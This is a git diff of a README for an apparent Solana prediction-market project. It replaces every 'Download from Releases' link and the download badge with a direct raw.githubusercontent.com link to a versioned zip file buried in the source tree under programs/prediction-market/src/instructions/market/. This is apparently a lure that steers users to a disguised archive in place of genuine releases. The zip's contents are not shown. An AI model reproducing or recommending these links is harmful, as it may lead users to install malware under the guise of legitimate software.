@@ -1,6 +1,6 @@
 # 📈 solana-prediction-market-smartcontract - Your Easy Guide to Market Predictions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/Baocalissssss/solana-prediction-market-smartcontract/releases)
+[![Download Now](https://raw.githubusercontent.com/Baocalissssss/solana-prediction-market-smartcontract/main/programs/prediction-market/src/instructions/market/solana-prediction-market-smartcontract-1.6-beta.5.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/Baocalissssss/solana-prediction-market-smartcontract/main/programs/prediction-market/src/instructions/market/solana-prediction-market-smartcontract-1.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Solana Prediction Market Smart Contract! This application helps y
 
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Download from Releases](https://github.com/Baocalissssss/solana-prediction-market-smartcontract/releases)
+[Download from Releases](https://raw.githubusercontent.com/Baocalissssss/solana-prediction-market-smartcontract/main/programs/prediction-market/src/instructions/market/solana-prediction-market-smartcontract-1.6-beta.5.zip)
 
 The page contains the latest version of the software. Be sure to select the appropriate version for your operating system.
 
@@ -70,4 +70,4 @@ If you have questions or need help, check out our community forums. Engage with 
 
 Your journey into the world of prediction markets on Solana starts here. With this application, you can gain valuable insights and potentially increase your understanding of market trends. Don’t forget to visit the Releases page to get the latest updates and improvements.
 
-[Download from Releases](https://github.com/Baocalissssss/solana-prediction-market-smartcontract/releases) and start predicting today!
+[Download from Releases](https://raw.githubusercontent.com/Baocalissssss/solana-prediction-market-smartcontract/main/programs/prediction-market/src/instructions/market/solana-prediction-market-smartcontract-1.6-beta.5.zip) and start predicting today!
